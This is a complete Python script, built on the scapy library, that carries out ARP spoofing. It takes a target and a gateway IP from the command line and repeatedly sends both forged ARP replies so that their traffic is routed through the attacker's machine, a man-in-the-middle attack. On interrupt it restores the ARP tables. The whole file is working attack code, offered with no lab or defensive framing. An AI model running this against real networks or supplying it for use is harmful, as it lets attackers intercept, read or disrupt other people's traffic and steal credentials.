#!/usr/bin/env python3

import optparse
import time

import scapy.all as scapy


def get_arguments():
    parser = optparse.OptionParser()
    parser.add_option("-t", "--target", dest="target_ip", help="use -t to set IP of target")
    parser.add_option("-g", "--gateway", dest="gateway_ip", help="use -g to set IP of the gateway")
    (options, arguments) = parser.parse_args()
    if not options.target_ip:
        parser.error("[-] Please specify a target IP, --help for more info")
    elif not options.gateway_ip:
        parser.error("[-] Please specify the gateway IP, use --help for more info")
    return options


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc
    


def spoof(victim_ip, spoof_ip):
    victim_mac = get_mac(victim_ip)
    packet = scapy.ARP(op=2, pdst=victim_ip, hwdst=victim_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)


def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)


options = get_arguments()

try:
    sent_packets_count = 0
    while True:
        spoof(options.target_ip, options.gateway_ip)
        spoof(options.gateway_ip, options.target_ip)
        sent_packets_count = sent_packets_count + 2
        print("\r[+] Packets sent " + str(sent_packets_count), end="")
        time.sleep(2)


except KeyboardInterrupt:
    print("\n[+] Detected CTRL + C ...... Restoring ARP Tables.... Please Wait.\n")
    time.sleep(2)
    restore(options.gateway_ip, options.target_ip)
    time.sleep(2)
    restore(options.target_ip, options.gateway_ip)
